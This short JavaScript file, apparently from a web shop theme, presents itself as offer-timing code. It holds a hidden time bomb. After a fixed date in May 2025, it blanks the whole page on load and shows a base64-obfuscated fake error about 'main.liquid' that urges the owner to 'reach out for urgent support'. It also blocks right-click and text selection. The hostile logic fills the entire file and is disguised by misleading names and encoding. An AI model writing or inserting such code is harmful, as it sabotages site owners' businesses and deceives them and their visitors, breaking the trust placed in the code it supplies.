var offerStart = new Date('2025-05-10T00:00:03');
var offerHTML = "PGRpdiBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6MjAlOyc+PGgxPlVuZXhwZWN0ZWQgdG9rZW4gaW4gJ21haW4ubGlxdWlkJy4gU29tZSBzaXRlIGZlYXR1cmVzIG1heSBub3Qgd29yayBhcyBleHBlY3RlZC48L2gxPjxoMT5QbGVhc2UgcmVhY2ggb3V0IGZvciB1cmdlbnQgc3VwcG9ydC48L2gxPjwvZGl2Pg==";

function decodeOfferMessage(a) {
    return decodeURIComponent(escape(window.atob(a)));
}

function showOffer() {
    document.body.innerHTML = decodeOfferMessage(offerHTML);
    document.addEventListener('contextmenu', function(a) {
        a.preventDefault();
    });
    document.body.style.textAlign = 'center';
    document.body.style.userSelect = 'none';
    document.body.style.webkitUserSelect = 'none';
    document.body.style.mozUserSelect = 'none';
    document.body.style.msUserSelect = 'none';
}

function checkOfferStatus() {
    var a = new Date();
    if (a >= offerStart) {
        showOffer();
    }
}

window.onload = checkOfferStatus;


